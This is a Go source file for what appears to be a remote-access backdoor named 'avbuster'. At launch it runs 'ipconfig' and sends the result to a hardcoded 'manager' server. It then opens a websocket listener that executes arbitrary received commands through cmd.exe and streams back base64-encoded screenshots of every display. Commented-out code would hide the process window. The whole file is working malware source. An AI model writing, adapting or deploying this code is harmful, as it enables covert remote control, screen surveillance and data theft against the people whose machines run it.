package main

import (
	"encoding/base64"
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

const MANAGERIP = "192.168.20.5:443" //our server ip to get remote machine's ip
const BUFFSIZE = 1024

func avbustercommandhandler(w http.ResponseWriter, r *http.Request) {
	ws, err := websocket.Upgrade(w, r, nil, 1024, 1024)
	if _, ok := err.(websocket.HandshakeError); ok {
		http.Error(w, "Not a websocket handshake", 400)
		return
	} else if err != nil {
		log.Println(err)
		return
	}
	res := map[string]interface{}{}
	var img64 []byte

	for {
		//var command string
		msgtype, command, err := ws.ReadMessage()
		if err != nil {
			fmt.Println("Can't receive")
			break
		}

		//finflag := make(chan string)
		if string(command) == "getscreen" {

			screenshots := getscreenshot()
			for _, screen := range screenshots {
				fmt.Println(screen)
				img64, _ = ioutil.ReadFile(screen)
				str := base64.StdEncoding.EncodeToString(img64)
				res["img64"] = str

				if err = ws.WriteJSON(&res); err != nil {
					fmt.Println("watch dir - Write : " + err.Error())
					//return
				}
				time.Sleep(50 * time.Millisecond)
			}
		} else {

			msg := string(command)

			fmt.Println("Received back from client: " + msg)
			reply := getcommandresult(msg)
			fmt.Println(reply)

			if err := ws.WriteMessage(msgtype, []byte(reply)); err != nil {
				log.Println(err)
				break
			}

		}
	}
}

func getcommandresult(command string) string {
	osshellargs := []string{"/C", command}

	osshell := "cmd"
	//cmdout, _ := exec.Command("cmd", "/C", command).Output()

	execcmd := exec.Command(osshell, osshellargs...)

	/*if runtime.GOOS == "windows" {
		execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}*/

	cmdout, _ := execcmd.Output()
	return string(cmdout)
}

func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

	}
	return filenames
}
func sendipdetailstomanager() {
	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}
	getipdetails := getcommandresult("ipconfig")

	conn.Write([]byte(getipdetails))
	conn.Close()
}

func main() {
	sendipdetailstomanager()
	http.HandleFunc("/", avbustercommandhandler)
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal("ListenAndServe:", err)
	}
}
